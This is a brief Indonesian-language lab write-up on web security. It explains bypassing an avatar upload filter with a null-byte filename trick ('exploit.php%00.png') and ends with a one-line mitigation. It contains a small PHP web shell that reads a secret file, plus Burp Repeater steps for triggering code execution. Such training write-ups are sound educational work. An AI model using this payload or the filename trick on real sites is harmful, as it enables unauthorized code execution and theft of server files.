# Lab: Web shell upload via obfuscated file extension

## Background

Pada lab ini terindikasi ada celah keamanan pada fungsi upload file yang dimana meskipun sudah diterapkan filterasi pada semua jenis file kecuali jpeg dan png user masih dapat melakukan teknik obfuskasi pada nama file sehingga masih dapat ditembus
keamanannya. Hal ini terjadi dan bekerja karena adanya perbedaan antara cara server dan web aplikasi membaca ekstensi file yang di obfuskasi, misal dalam kasus ini server dapat mendecode karakter low level seperti %00 sedangkan web aplikasi tidak. 

## Vulnerabilitiy Detail
type: file upload vulnerability
savirity: high
target `/my-account/avatar`
impact: remote code execution

## Step walk throught
1. Login
   -login menggunakan akun normal
   -cari menu file upload untuk avatar
2. pembuatan kode
   -siapkan file exploit.php dengan isi sebagai berikut:
   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
3. Delivery code
   -upload file exploit pada fungsi upload file lalu amati bahwa file anda gagal di upload karena ekstensi yang diizinkan hanyalah `.jpeg` dan `.png`
   -cari request yang ditunjukkan oleh step sebelumnya di burpsuite lalu kirim ke repeater
   -edit fieldname dari yang awalnya `exploit.php`lalu ubah menjadi `exploit.php%00.png` untuk mengelabui
4. Eksekusi
   -setelah terupload lakukan inspeksi pada element gambar atau tempat file upload tadi seharusnya di tampilkan di web dan cek src nya misa disini `/files/avatars/exploit.php` untuk mentriger remote code execution

## Mitigasi
Untuk mencegah celah seperti ini terapkan juga sistem validasi path untuk memastikan tidak menerima input karakter seperti %00 untuk mencegahnya
